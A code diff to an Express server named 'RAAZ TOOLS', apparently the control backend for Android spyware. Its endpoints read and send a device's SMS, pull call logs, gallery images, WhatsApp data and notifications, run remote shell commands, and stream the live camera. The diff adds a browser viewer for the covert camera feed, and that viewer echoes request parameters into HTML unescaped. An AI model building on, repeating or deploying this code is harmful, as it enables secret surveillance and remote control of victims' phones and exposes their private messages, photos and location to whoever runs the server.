@@ -2,7 +2,7 @@
 // ║         RAAZ TOOLS - SERVER v4.0 (Render Deploy)            ║
 // ║  SMS Read+Send, Calls, Gallery Fix, WhatsApp, APK Auto,     ║
 // ║  Notifications, SIM, Battery, Toast Lock, Live Camera,      ║
-// ║  Internet CMD, Flashlight                                    ║
+// ║  Internet CMD, Flashlight, HTML Viewer                      ║
 // ╚══════════════════════════════════════════════════════════════╝
 
 const express = require('express');
@@ -15,7 +15,7 @@ const PORT    = process.env.PORT || 3000;
 const serviceAccount = require('./serviceAccountKey.json');
 admin.initializeApp({
   credential:  admin.credential.cert(serviceAccount),
-  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com'
+  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // <-- REPLACE with your DB URL
 });
 const db = admin.database();
 
@@ -188,8 +188,7 @@ app.get('/api/sms/:deviceId', async (req, res) => {
 });
 
 // ════════════════════════════════════════════════════════════════
-//   📤 SMS SEND (NEW FEATURE)
-//   Android app uses SmsManager to send SMS
+//   SMS SEND
 // ════════════════════════════════════════════════════════════════
 app.post('/api/sms/send', async (req, res) => {
   const { deviceId, to, message } = req.body;
@@ -218,7 +217,7 @@ app.get('/api/calls/:deviceId', async (req, res) => {
 });
 
 // ════════════════════════════════════════════════════════════════
-//   GALLERY IMAGES (Fixed with proper chunking support)
+//   GALLERY IMAGES
 // ════════════════════════════════════════════════════════════════
 app.get('/api/gallery/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
@@ -231,7 +230,7 @@ app.get('/api/gallery/:deviceId', async (req, res) => {
 });
 
 // ════════════════════════════════════════════════════════════════
-//   WHATSAPP
+//   WHATSAPP (requires separate logging on device)
 // ════════════════════════════════════════════════════════════════
 app.get('/api/whatsapp/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
@@ -355,14 +354,10 @@ app.post('/api/dismissToast', async (req, res) => {
 });
 
 // ════════════════════════════════════════════════════════════════
-//   📷 LIVE CAMERA — MJPEG Stream
-//
-//   Android app posts JPEG frames → server broadcasts to all viewers
-//   Termux views: mpv http://server/api/camera/stream/:deviceId
-//   Or saves frames with curl
+//   LIVE CAMERA — MJPEG Stream
 // ════════════════════════════════════════════════════════════════
 
-// Termux / browser opens this URL to view live stream
+// MJPEG stream endpoint (for mpv, curl, etc.)
 app.get('/api/camera/stream/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
   const camera = req.query.camera || 'back';
@@ -435,9 +430,31 @@ app.get('/api/camera/snapshot/:deviceId', async (req, res) => {
   } catch (e) { res.status(408).json({ error: e.message }); }
 });
 
+// HTML Viewer for browser
+app.get('/view/:deviceId', (req, res) => {
+  const { deviceId } = req.params;
+  const camera = req.query.camera || 'back';
+  res.send(`
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>RAAZ Live Stream</title>
+      <style>
+          body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
+          img { border: 2px solid #0f0; max-width: 100%; height: auto; }
+      </style>
+  </head>
+  <body>
+      <h2>📷 Live Camera Feed – ${deviceId}</h2>
+      <img src="/api/camera/stream/${deviceId}?camera=${camera}" />
+      <p>If stream doesn't appear, try <a href="/api/camera/stream/${deviceId}?camera=${camera}" target="_blank">direct MJPEG link</a>.</p>
+  </body>
+  </html>
+  `);
+});
+
 // ════════════════════════════════════════════════════════════════
-//   🌐 INTERNET / SHELL CMD
-//   Device runs the command and returns output
+//   SHELL CMD
 // ════════════════════════════════════════════════════════════════
 app.post('/api/cmd', async (req, res) => {
   const { deviceId, command } = req.body;
@@ -475,6 +492,7 @@ server.listen(PORT, () => {
 ║   ✅  RAAZ TOOLS SERVER v4.0            ║
 ║   🚀  Port     : ${PORT}                    ║
 ║   📷  Camera   : MJPEG Live Stream      ║
+║   🌐  HTML Viewer : /view/:deviceId     ║
 ║   📤  SMS Send : Active                 ║
 ║   🌐  Internet CMD : Active             ║
 ║   🔥  Toast Lock : Active               ║
